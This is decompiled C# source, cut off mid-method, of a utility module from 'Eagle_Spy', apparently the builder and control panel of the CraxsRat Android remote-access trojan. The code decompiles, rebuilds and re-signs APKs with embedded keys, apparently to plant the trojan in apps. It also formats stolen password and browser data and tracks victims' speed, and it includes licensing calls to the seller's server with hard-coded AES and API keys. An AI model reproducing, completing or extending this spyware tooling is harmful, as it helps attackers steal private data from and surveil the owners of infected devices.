#define DEBUG
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web;
using System.Windows.Forms;
using System.Xml;
using Eagle_Spy.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using Newtonsoft.Json.Linq;

namespace Eagle_Spy;

[StandardModule]
internal sealed class Codes
{
	private enum EXECUTION_STATE
	{
		ES_SYSTEM_REQUIRED = 1,
		ES_DISPLAY_REQUIRED = 2,
		ES_CONTINUOUS = int.MinValue
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__26_002D0
	{
		public Random _0024VB_0024Local_random;

		public _Closure_0024__26_002D0(_Closure_0024__26_002D0 arg0)
		{
			if (arg0 != null)
				_0024VB_0024Local_random = arg0._0024VB_0024Local_random;
		}

		[SpecialName]
		internal char _Lambda_0024__0(string s)
		{
			return s[_0024VB_0024Local_random.Next(s.Length)];
		}

		[SpecialName]
		internal char _Lambda_0024__1(string s)
		{
			return s[_0024VB_0024Local_random.Next(s.Length)];
		}
	}

	public const int WM_NCLBUTTONDOWN = 161;

	public const int HT_CAPTION = 2;

	private static WebClient webc = new WebClient();

	private static ImageAttributes imageAttributes = new ImageAttributes();

	private const uint WDA_NONE = 0u;

	public const uint WDA_MONITOR = 1u;

	private const uint WDA_EXCLUDEFROMCAPTURE = 17u;

	public static string TempPathCache = Path.Combine(Path.GetTempPath(), "AET", "Cache");

	public static string[] pngs = new string[3] { "mipmap-hdpi-v4", "drawable-hdpi-v4", "mipmap-hdpi" };

	private static Random rshit;

	private static WebBrowser wb = new WebBrowser();

	[SpecialName]
	private static long _0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload;

	[SpecialName]
	private static StaticLocalInitFlag _0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload_0024Init;

	[SpecialName]
	private static long _0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload;

	[SpecialName]
	private static StaticLocalInitFlag _0024STATIC_0024UploadDownload_0024021281A5AA_0024LastDownload_0024Init;

	public static bool IsValidPackageName(string packageName)
	{
		if (string.IsNullOrWhiteSpace(packageName))
			return false;
		if (!char.IsLetter(packageName[0]))
			return false;
		Regex regex = new Regex("^[a-zA-Z0-9.]+$");
		if (!regex.IsMatch(packageName))
			return false;
		if (!packageName.Contains("."))
			return false;
		if (!packageName.StartsWith(".") && !packageName.EndsWith("."))
			return true;
		return false;
	}

	public static bool CheckPort(int Port)
	{
		IPGlobalProperties iPGlobalProperties = IPGlobalProperties.GetIPGlobalProperties();
		IPEndPoint[] activeTcpListeners = iPGlobalProperties.GetActiveTcpListeners();
		IPEndPoint[] array = activeTcpListeners;
		int num = 0;
		while (true)
		{
			if (num < array.Length)
			{
				IPEndPoint iPEndPoint = array[num];
				if (iPEndPoint.Port == Port)
					break;
				num = checked(num + 1);
				continue;
			}
			return true;
		}
		return false;
	}

	public static string ServerMessage(string url, bool ispost = false, string postParams = "")
	{
		try
		{
			WebRequest webRequest = WebRequest.Create(url);
			webRequest.Method = "GET";
			if (ispost)
			{
				webRequest.Method = "POST";
				byte[] bytes = System.Text.Encoding.UTF8.GetBytes(postParams);
				webRequest.ContentType = "application/x-www-form-urlencoded";
				webRequest.ContentLength = bytes.Length;
				using Stream stream = webRequest.GetRequestStream();
				stream.Write(bytes, 0, bytes.Length);
			}
			WebResponse response = webRequest.GetResponse();
			using Stream stream2 = response.GetResponseStream();
			using StreamReader streamReader = new StreamReader(stream2);
			return streamReader.ReadToEnd();
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
		return "Error";
	}

	public static string ReadConfig(string childName)
	{
		try
		{
			string baseDirectory = AppDomain.CurrentDomain.BaseDirectory;
			string text = File.ReadAllText(baseDirectory + "\\Config.json");
			JObject jObject = JObject.Parse(AES_Decrypt(text, "q}%h%anHhw;sW.u*$eX{W]EYCHo9m8PxK;"));
			JToken jToken = jObject["Cloud"];
			JToken jToken2 = jToken[childName];
			return jToken2.ToString();
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
		return "null";
	}

	public static int nearstmulti(int v, int n)
	{
		return checked((int)Math.Round(Math.Round((double)v / (double)n) * (double)n));
	}

	public static Bitmap ReadBitmapFromFile(string s_Path)
	{
		Bitmap result;
		try
		{
			using FileStream stream = new FileStream(s_Path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			using Bitmap original = new Bitmap(stream);
			result = new Bitmap(original);
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			result = new Bitmap(4, 4);
			//////CraxsAlert.Showinformation("Sorry");
		}
		return result;
	}

	public static string GetDriv()
	{
		string result;
		try
		{
			string[] separator = new string[1] { "\\" };
			string[] array = Application.StartupPath.Split(separator, StringSplitOptions.RemoveEmptyEntries);
			result = array[0].ToString() + "\\";
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			result = "C:\\";
			//////CraxsAlert.Showinformation("Sorry");
		}
		return result;
	}

	public static string hashmd5(string file_name)
	{
		byte[] array;
		using (MD5 mD = MD5.Create())
		{
			using FileStream fileStream = File.OpenRead(file_name);
			fileStream.Position = 0L;
			array = mD.ComputeHash(fileStream);
		}
		object objectValue = RuntimeHelpers.GetObjectValue(ComputeHash(array));
		return Conversions.ToString(objectValue);
	}

	public static string FindActivityInSmali(string TheApkPath, string activityName, string smaliFolderPath)
	{
		string text = activityName.Replace('.', '/');
		string text2 = TheApkPath + "/" + smaliFolderPath + "/" + text + ".smali";
		if (File.Exists(text2))
			return text2;
		return "pass";
	}

	public static bool FileInUse(string sFile)
	{
		bool result = false;
		if (File.Exists(sFile))
			try
			{
				using (new FileStream(sFile, FileMode.Open, FileAccess.ReadWrite, FileShare.None))
				{
				}
			}
			catch (Exception)
			{
				//ProjectData.SetProjectError(projectError);
				result = true;
				//////CraxsAlert.Showinformation("Sorry");
			}
		return result;
	}

	public static List<string> GetActivityNames(string manifestPath, bool OnlyMain)
	{
		List<string> list = new List<string>();
		XmlDocument xmlDocument = new XmlDocument();
		xmlDocument.Load(manifestPath);
		XmlNamespaceManager xmlNamespaceManager = new XmlNamespaceManager(xmlDocument.NameTable);
		xmlNamespaceManager.AddNamespace("android", "http://schemas.android.com/apk/res/android");
		XmlNodeList xmlNodeList = xmlDocument.SelectNodes("//manifest/application/activity[intent-filter/action/@android:name='android.intent.action.MAIN']/@android:name", xmlNamespaceManager);
		foreach (XmlNode item in xmlNodeList)
		{
			Console.WriteLine(item.Value);
			list.Add(item.Value);
		}
		if (OnlyMain)
		{
			if (list.Count > 0)
				return list;
			Interaction.MsgBox("Detecting Main Activities Failed , Searching for other Activitys...");
		}
		XmlNodeList xmlNodeList2 = xmlDocument.SelectNodes("//manifest/application/activity/@android:name", xmlNamespaceManager);
		foreach (XmlNode item2 in xmlNodeList2)
		{
			list.Add(item2.Value);
		}
		if (list.Count > 0)
			return list;
		Interaction.MsgBox("Failed to find Activities...");
		return null;
	}

	public static object ComputeHash(byte[] array)
	{
		string text = "";
		checked
		{
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				text += array[i].ToString("X2");
			}
			return text.ToLower();
		}
	}

	[DllImport("user32.dll")]
	public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

	[DllImport("user32.dll")]
	public static extern bool ReleaseCapture();

	public static Image Base64ToImage(string base64string)
	{
		string s = base64string.Replace(" ", "+");
		byte[] buffer = Convert.FromBase64String(s);
		MemoryStream memoryStream = new MemoryStream(buffer);
		Image result = Image.FromStream(memoryStream);
		memoryStream.Dispose();
		return result;
	}

	public static string ProcessJson(string chromeJson)
	{
		return chromeJson.Replace("}", "").Replace("]", "").Replace("[", "")
			.Replace("\"", " ")
			.Replace("{", "\r\n")
			.Replace(",", "\r\n");
	}

	public static object inializeReg()
	{
		RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
		string text = "Software\\\\DataConfigrations";
		RegistryKey registryKey2 = registryKey.OpenSubKey(text, writable: true);
		try
		{
			if (registryKey2 == null)
				registryKey2 = registryKey.CreateSubKey(text);
			return true;
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
		return false;
	}

	public static void GetKeyFromReg(string key)
	{
		RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
		string name = "Software\\\\DataConfigrations";
		RegistryKey registryKey2 = registryKey.OpenSubKey(name, writable: true);
		registryKey2.SetValue("PASSKEY", key);
		registryKey2.Close();
	}

	public static string getuserkey()
	{
		try
		{
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
			string name = "Software\\\\DataConfigrations";
			using RegistryKey registryKey2 = registryKey.OpenSubKey(name, writable: true);
			object objectValue = RuntimeHelpers.GetObjectValue(registryKey2.GetValue("PASSKEY"));
			if (objectValue != null)
				return registryKey2.GetValue("PASSKEY").ToString();
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
		return "";
	}

	public static Encoding Encoding()
	{
		return System.Text.Encoding.UTF8;
	}

	public static Image ChangeImageOpacity(Bitmap originalImage)
	{
		float num = 50f;
		float gamma = 1f;
		float num2 = 0f;
		float[][] newColorMatrix = new float[5][]
		{
			new float[5] { num, 0f, 0f, 0f, 0f },
			new float[5] { 0f, num, 0f, 0f, 0f },
			new float[5] { 0f, 0f, num, 0f, 0f },
			new float[5] { 0f, 0f, 0f, 1f, 0f },
			new float[5] { num2, num2, num2, 0f, 1f }
		};
		imageAttributes.ClearColorMatrix();
		imageAttributes.SetColorMatrix(new ColorMatrix(newColorMatrix), ColorMatrixFlag.Default, ColorAdjustType.Bitmap);
		imageAttributes.SetGamma(gamma, ColorAdjustType.Bitmap);
		Graphics graphics = Graphics.FromImage(originalImage);
		graphics.DrawImage(originalImage, new Rectangle(0, 0, originalImage.Width, originalImage.Height), 0, 0, originalImage.Width, originalImage.Height, GraphicsUnit.Pixel, imageAttributes);
		return originalImage;
	}

	public static string GenerateRandomFolderName(string nam)
	{
		_Closure_0024__26_002D0 arg = default(_Closure_0024__26_002D0);
		_Closure_0024__26_002D0 CS_0024_003C_003E8__locals0 = new _Closure_0024__26_002D0(arg);
		string tempPath = Path.GetTempPath();
		string element = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		int count = 10;
		CS_0024_003C_003E8__locals0._0024VB_0024Local_random = new Random();
		string path = "CraxsRat_" + nam + "_" + new string((from s in Enumerable.Repeat(element, 10)
			select s[CS_0024_003C_003E8__locals0._0024VB_0024Local_random.Next(s.Length)]).ToArray());
		string text = Path.Combine(tempPath, path);
		string driv = GetDriv();
		while (Directory.Exists(text))
		{
			path = driv + "CraxsRat_" + nam + "_" + new string((from s in Enumerable.Repeat(element, count)
				select s[CS_0024_003C_003E8__locals0._0024VB_0024Local_random.Next(s.Length)]).ToArray());
			text = Path.Combine(tempPath, path);
		}
		Directory.CreateDirectory(text);
		return text;
	}

	public static void DirectoryDeleteLong(string directoryPath)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(Path.GetTempPath() + "\\TempEmptyDirectory-" + Guid.NewGuid().ToString());
		try
		{
			directoryInfo.Create();
			using (Process process = new Process())
			{
				process.StartInfo.FileName = "robocopy.exe";
				process.StartInfo.Arguments = "\"" + directoryInfo.FullName + "\" \"" + directoryPath + "\" /mir /r:1 /w:1 /np /xj /sl";
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.CreateNoWindow = true;
				process.Start();
				process.WaitForExit();
			}
			directoryInfo.Delete();
			if (Directory.Exists(directoryPath))
			{
				DirectoryInfo directoryInfo2 = new DirectoryInfo(directoryPath);
				directoryInfo2.Attributes = FileAttributes.Normal;
				Directory.Delete(directoryPath);
			}
		}
		catch (IOException projectError)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
	}

	[DllImport("user32.dll")]
	public static extern uint SetWindowDisplayAffinity(IntPtr hWnd, uint dwAffinity);

	public static string GetSpeed(string speed)
	{
		int num = checked((int)Math.Round((double)(Conversions.ToInteger(speed) * 3600) / 1000.0));
		return $"{num} km/h";
	}

	public static string Duration(int Time)
	{
		int num = Time % 60;
		checked
		{
			int num2 = (int)Math.Round((double)(Time - num) / 60.0 % 60.0);
			int num3 = (int)Math.Round((double)(Time - (num + num2 * 60)) / 3600.0 % 60.0);
			return Strings.Format(num3, "00") + ":" + Strings.Format(num2, "00") + ":" + Strings.Format(num, "00").ToString();
		}
	}

	public static string ToTime(long Value)
	{
		long num = Value;
		long num2 = num / 3600L;
		long num3 = checked(num - num2 * 3600L) / 60L;
		num = checked(num - (num2 * 3600L + num3 * 60L));
		return $"{Conversions.ToString(num2)}:{Conversions.ToString(num3)}:{Conversions.ToString(num)}";
	}

	public static byte[] CGzip(byte[] b)
	{
		byte[] result;
		try
		{
			using MemoryStream memoryStream = new MemoryStream();
			if (memoryStream.CanSeek)
				memoryStream.Seek(0L, SeekOrigin.Begin);
			using (GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Compress, leaveOpen: true))
				gZipStream.Write(b, 0, b.Length);
			result = memoryStream.ToArray();
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			result = null;
			//////CraxsAlert.Showinformation("Sorry");
		}
		return result;
	}

	private static bool IsCompressedGZip(byte[] data)
	{
		if (data.Length < 2)
			return false;
		return data[0] == 31 && data[1] == 139;
	}

	public static byte[] DEgzip(ref byte[] b)
	{
		try
		{
			if (IsCompressedGZip(b))
			{
				using (MemoryStream memoryStream2 = new MemoryStream())
				{
					using MemoryStream memoryStream = new MemoryStream(b);
					if (memoryStream.CanSeek)
						memoryStream.Seek(0L, SeekOrigin.Begin);
					using (GZipStream input = new GZipStream(memoryStream, CompressionMode.Decompress))
						CopyStreamToStream(input, memoryStream2);
					return memoryStream2.ToArray();
				}
			}
			return null;
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
		return null;
	}

	public static void CopyStreamToStream(Stream input, Stream output)
	{
		try
		{
			byte[] array = new byte[16384];
			int num;
			do
			{
				num = input.Read(array, 0, array.Length);
				output.Write(array, 0, num);
			}
			while (num != 0);
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
	}

	private static T InlineAssignHelper<T>(ref T target, T value)
	{
		target = value;
		return value;
	}

	public static object BSEN(string Str)
	{
		byte[] bytes = System.Text.Encoding.UTF8.GetBytes(Str);
		return Convert.ToBase64String(bytes);
	}

	public static Image BlankImage()
	{
		Image result;
		try
		{
			Bitmap bitmap = new Bitmap(1, 1);
			bitmap.SetPixel(0, 0, Color.Transparent);
			result = bitmap;
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			result = null;
			//////CraxsAlert.Showinformation("Sorry");
		}
		return result;
	}

	public static string Translate(string inputtext, string fromlangid, string tolangid)
	{
		try
		{
			inputtext = HttpUtility.HtmlAttributeEncode(inputtext.Replace("\r\n", "[]"));
			WebClient webClient = new WebClient();
			webClient.Encoding = System.Text.Encoding.UTF8;
			string json = webClient.DownloadString("https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=" + tolangid + "&hl=" + fromlangid + "&dt=t&dt=bd&dj=1&source=icon&q=" + inputtext);
			JObject jObject = JObject.Parse(json);
			string text = jObject.SelectToken("sentences[0]").SelectToken("trans").ToString();
			return text.Replace("[]", "\r\n");
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
		return inputtext.Replace("[]", "\r\n");
	}

	public static bool MyMsgBox(string title, string msg, bool useno, Bitmap ico)
	{
		try
		{
			string text = msg;
			string language = RegistryHandler.Get_Language();
			if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
			{
				if (Operators.CompareString(language, "AR", TextCompare: false) == 0)
					text = Translate(text, "en", "ar");
			}
			else
				text = Translate(text, "en", "zh");
			CraxsMsgbox craxsMsgbox = new CraxsMsgbox(title.Replace("  ", "\r\n"), text, useno, ico);
			if (craxsMsgbox.ShowDialog() == DialogResult.Yes)
				return true;
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
		return false;
	}

	public static string CheckForUpdates()
	{
		try
		{
			return ServerMessage(ReadConfig("CHECK_UPDATE"), ispost: true, "api=S0tMeD0WoUQyO8wuButveJYoBlONhU5riAKBPn6R&email=" + RegistryHandler.Get_EMAIL() + "&password=" + getuserkey() + "&HWID=" + (GetHWID() + RegistryHandler.Get_ID_ASSIST()).Trim());
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
		return "Error";
	}

	public static string Excuteapkeditor_pro(string apkpath)
	{
		string text = reso.res_Path + "\\Lib\\ApkEditor.jar";
		if (!File.Exists((reso.res_Path + "\\") ?? ""))
			File.WriteAllBytes(text, Resources.APKEditor);
		string text2 = "java -jar \"" + text + "\" p -i \"" + apkpath + "\" && EXIT";
		ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c " + text2);
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		Process process = Process.Start(processStartInfo);
		string result = process.StandardOutput.ReadToEnd();
		process.WaitForExit();
		return result;
	}

	public static string Excuteapkeditor(string apkpath)
	{
		string text = reso.res_Path + "\\Lib\\ApkEditor.jar";
		if (!File.Exists(text))
			File.WriteAllBytes(text, Resources.APKEditor);
		string text2 = "java -jar \"" + text + "\" info -i \"" + apkpath + "\" && EXIT";
		ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c " + text2);
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		Process process = Process.Start(processStartInfo);
		string result = process.StandardOutput.ReadToEnd();
		process.WaitForExit();
		return result;
	}

	public static string ExecuteDecompile(string apkpath, string outdir)
	{
		string text = reso.res_Path + "\\Lib\\apktool.jar";
		if (!File.Exists(text))
			File.WriteAllBytes(text, Resources.apktool);
		string text2 = "java -jar \"" + text + "\" d -f \"" + apkpath + "\" -o \"" + outdir + "\" && EXIT";
		ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c " + text2);
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		Process process = Process.Start(processStartInfo);
		string result = process.StandardOutput.ReadToEnd();
		process.WaitForExit();
		return result;
	}

	public static string ExecuteSign(string apkpath, string outfilepath)
	{
		string text = reso.res_Path + "\\Lib\\apksigner.jar";
		string text2 = reso.res_Path + "\\Lib\\key.pk8";
		string text3 = reso.res_Path + "\\Lib\\certificate.pem";
		File.WriteAllBytes(text3, Resources.c);
		File.WriteAllBytes(text2, Resources.k);
		if (!File.Exists(text))
			File.WriteAllBytes(text, Resources.apktool);
		string text4 = "java -jar \"" + text + "\" sign --key \"" + text2 + "\" --cert \"" + text3 + "\" --v2-signing-enabled true --v3-signing-enabled true --out \"" + outfilepath + "\" \"" + apkpath + "\" && EXIT";
		ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c " + text4);
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		Process process = Process.Start(processStartInfo);
		string result = process.StandardOutput.ReadToEnd();
		process.WaitForExit();
		return result;
	}

	public static string ExecuteCompile(string apkfolderpath, string outfilepath)
	{
		string text = reso.res_Path + "\\Lib\\apktool.jar";
		if (!File.Exists(text))
			File.WriteAllBytes(text, Resources.apktool);
		string text2 = "java -jar \"" + text + "\" b -f \"" + apkfolderpath + "\" -o \"" + outfilepath + "\" && EXIT";
		ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c " + text2);
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		Process process = Process.Start(processStartInfo);
		string result = process.StandardOutput.ReadToEnd();
		process.WaitForExit();
		return result;
	}

	public static object RegexMatcher(string text, string match)
	{
		Regex regex = new Regex(text);
		Match match2 = regex.Match(match);
		return match2.ToString();
	}

	public static string GetAndroidVersionName(string sdkNumber)
	{
		int result = 0;
		if (int.TryParse(sdkNumber, out result))
			return result switch
			{
				16 => "Android 4.1 (Jelly Bean)", 
				17 => "Android 4.2 (Jelly Bean)", 
				18 => "Android 4.3 (Jelly Bean)", 
				19 => "Android 4.4 (KitKat)", 
				21 => "Android 5.0 (Lollipop)", 
				22 => "Android 5.1 (Lollipop)", 
				23 => "Android 6.0 (Marshmallow)", 
				24 => "Android 7.0 (Nougat)", 
				25 => "Android 7.1 (Nougat)", 
				26 => "Android 8.0 (Oreo)", 
				27 => "Android 8.1 (Oreo)", 
				28 => "Android 9 (Pie)", 
				29 => "Android 10", 
				30 => "Android 11", 
				31 => "Android 12", 
				32 => "Android 13", 
				33 => "Android 14", 
				_ => "null", 
			};
		return "null";
	}

	public static string ProcessStartWithOutput(string FileName, string Arguments, int waitfor = 5000)
	{
		string text = string.Empty;
		try
		{
			using Process process = new Process();
			process.StartInfo.FileName = FileName;
			process.StartInfo.Arguments = Arguments;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.RedirectStandardError = true;
			process.StartInfo.UseShellExecute = false;
			process.Start();
			text = process.StandardOutput.ReadToEnd().Trim() + process.StandardError.ReadToEnd().Trim();
			if (waitfor == 0)
				process.WaitForExit();
			else
				process.WaitForExit(waitfor);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception value = ex;
			Debug.WriteLine(value);
			//////CraxsAlert.Showinformation("Sorry");
		}
		Debug.WriteLine(text);
		return text;
	}

	public static string RealPath(string path = "")
	{
		return Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + path;
	}

	public static string ExtractName(string apkpath)
	{
		string pattern = "AppName=\"([^\"]+)\"";
		Match match = Regex.Match(Excuteapkeditor(apkpath), pattern);
		if (match.Success)
			return match.Groups[1].Value;
		return "";
	}

	public static string ExtractPackage(string apkpath)
	{
		string pattern = "package=\"([^\"]+)\"";
		Match match = Regex.Match(Excuteapkeditor(apkpath), pattern);
		if (match.Success)
			return match.Groups[1].Value;
		return "";
	}

	public static string WhatNewupdate()
	{
		try
		{
			string text = ServerMessage(ReadConfig("WhatNew"), ispost: true, "api=5XqtqjEv1eYwPeZAde1u9yWlu&email=" + RegistryHandler.Get_EMAIL() + "&password=" + getuserkey() + "&HWID=" + (GetHWID() + RegistryHandler.Get_ID_ASSIST()).Trim());
			if (text.StartsWith("update"))
				return text.Replace("[nl]", "\r\n");
			return "ERROR";
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
		return "ERROR";
	}

	public static void File_zip_Decompress(string zipPath, string pathfolder)
	{
		if (!Directory.Exists(pathfolder))
			Directory.CreateDirectory(pathfolder);
		ZipFile.ExtractToDirectory(zipPath, pathfolder);
	}

	public static Image ResizeImage(Image inputImage, Size size, bool preserveAspectRatio = false)
	{
		if (inputImage.Width == size.Width && inputImage.Height == size.Height)
			return inputImage;
		int width = size.Width;
		int height = size.Height;
		checked
		{
			if (preserveAspectRatio)
			{
				int width2 = inputImage.Width;
				int height2 = inputImage.Height;
				float num = (float)Math.Min((double)size.Width / (double)width2, (double)size.Height / (double)height2);
				width = (int)Math.Round((float)width2 * num);
				height = (int)Math.Round((float)height2 * num);
			}
			Bitmap bitmap = new Bitmap(width, height);
			using (Graphics graphics = Graphics.FromImage(bitmap))
			{
				graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
				graphics.DrawImage(inputImage, 0, 0, width, height);
			}
			return bitmap;
		}
	}

	public static string GetHWID()
	{
		string result = default(string);
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			try
			{
				string arg = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1);
				ManagementObject managementObject = new ManagementObject($"win32_logicaldisk.deviceid=\"{arg}:\"");
				managementObject.Get();
				stringBuilder.Append(managementObject["VolumeSerialNumber"].ToString());
			}
			catch (Exception)
			{
				//ProjectData.SetProjectError(projectError);
				stringBuilder.Append("VSVALID");
				//////CraxsAlert.Showinformation("Sorry");
			}
			SelectQuery query = new SelectQuery("Win32_BaseBoard");
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(query);
			try
			{
				foreach (ManagementObject item in managementObjectSearcher.Get())
				{
					stringBuilder.Append(item["SerialNumber"].ToString());
				}
			}
			catch (Exception)
			{
				//ProjectData.SetProjectError(projectError2);
				stringBuilder.Append("SNVALID");
				//////CraxsAlert.Showinformation("Sorry");
			}
			try
			{
				query = new SelectQuery("Win32_processor");
				managementObjectSearcher = new ManagementObjectSearcher(query);
				foreach (ManagementObject item2 in managementObjectSearcher.Get())
				{
					stringBuilder.Append(item2["processorId"].ToString());
				}
			}
			catch (Exception)
			{
				//ProjectData.SetProjectError(projectError3);
				stringBuilder.Append("PIVALID");
				//////CraxsAlert.Showinformation("Sorry");
			}
			result = stringBuilder.ToString().Trim().Replace("+", "_");
			return result;
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError4);
			Interaction.MsgBox("Error Generate ID");
			Environment.FailFast("Error Generate ID");
			//////CraxsAlert.Showinformation("Sorry");
		}
		return result;
	}

	public static object[] SplitByte(byte[] b, Array s)
	{
		object[] array = new object[2];
		MemoryStream memoryStream = new MemoryStream();
		long num = (long)s.GetValue(0);
		checked
		{
			memoryStream.Write(b, 0, (int)num);
			byte[] b2 = memoryStream.ToArray();
			array[0] = DEgzip(ref b2);
			memoryStream.Dispose();
			memoryStream = new MemoryStream();
			long num2 = (long)s.GetValue(1);
			memoryStream.Write(b, (int)num, (int)num2);
			b2 = memoryStream.ToArray();
			array[1] = DEgzip(ref b2);
			memoryStream.Dispose();
			return array;
		}
	}

	public static object Formatpassdata(string msg)
	{
		if (!msg.Contains("~"))
			return msg;
		return msg.Replace("~", "\r\n").Replace("[EOF]", "--------------");
	}

	public static string ExtractDomain(string input)
	{
		string result = "Blank";
		if (input.Contains("/"))
		{
			if (!Uri.TryCreate(input, UriKind.Absolute, out var result2))
				return input.Substring(0, input.IndexOf("/")).Trim();
			result = result2.Host;
		}
		return result;
	}

	private static int FindIndex(byte[] source, byte[] pattern)
	{
		checked
		{
			int num = source.Length - pattern.Length;
			int num2 = 0;
			while (true)
			{
				if (num2 <= num)
				{
					bool flag = true;
					int num3 = pattern.Length - 1;
					for (int i = 0; i <= num3; i++)
					{
						if (source[num2 + i] != pattern[i])
						{
							flag = false;
							break;
						}
					}
					if (flag)
						break;
					num2++;
					continue;
				}
				return -1;
			}
			return num2;
		}
	}

	public static string BSDE(string Str)
	{
		return System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(Str));
	}

	public static Point FixSize(Form lc0, Form lc1)
	{
		checked
		{
			int num = lc0.Location.X + (int)Math.Round((double)lc0.Width / 2.0) - (int)Math.Round((double)lc1.Width / 2.0);
			int num2 = lc0.Location.Y + (int)Math.Round((double)lc0.Height / 2.0) - (int)Math.Round((double)lc1.Height / 2.0);
			if (num < 0)
				num = 0;
			if (num2 < 0)
				num2 = 0;
			if (num > Screen.PrimaryScreen.WorkingArea.Size.Width - lc1.Size.Width)
				num = Screen.PrimaryScreen.WorkingArea.Size.Width - lc1.Size.Width;
			if (num2 > Screen.PrimaryScreen.WorkingArea.Size.Height - lc1.Size.Height)
				num2 = Screen.PrimaryScreen.WorkingArea.Size.Height - lc1.Size.Height;
			return new Point(num, num2);
		}
	}

	public static Array BytesConverter(long bytes)
	{
		long num = 1024L;
		long num2 = 1048576L;
		long num3 = 1073741824L;
		long num4 = 1099511627776L;
		string text = "0 Bytes";
		if (bytes < 1024L)
			text = Conversions.ToString(bytes) + " Bytes";
		else if (bytes > num4)
		{
			text = ((double)bytes / (double)num / (double)num / (double)num / (double)num).ToString("0.00") + " TB";
		}
		else if (bytes > num3)
		{
			text = ((double)bytes / (double)num / (double)num / (double)num).ToString("0.00") + " GB";
		}
		else if (bytes > num2)
		{
			text = ((double)bytes / (double)num / (double)num).ToString("0.00") + " MB";
		}
		else if (bytes >= num)
		{
			text = ((double)bytes / (double)num).ToString("0.00") + " KB";
		}
		return new string[1] { text.ToString() };
	}

	public static Array UploadDownload(long ParametersLong0, long ParametersLong1)
	{
		checked
		{
			Array result;
			try
			{
				if (_0024STATIC_0024UploadDownload_0024021281A5AA_0024LastUpload_0024Init == null)
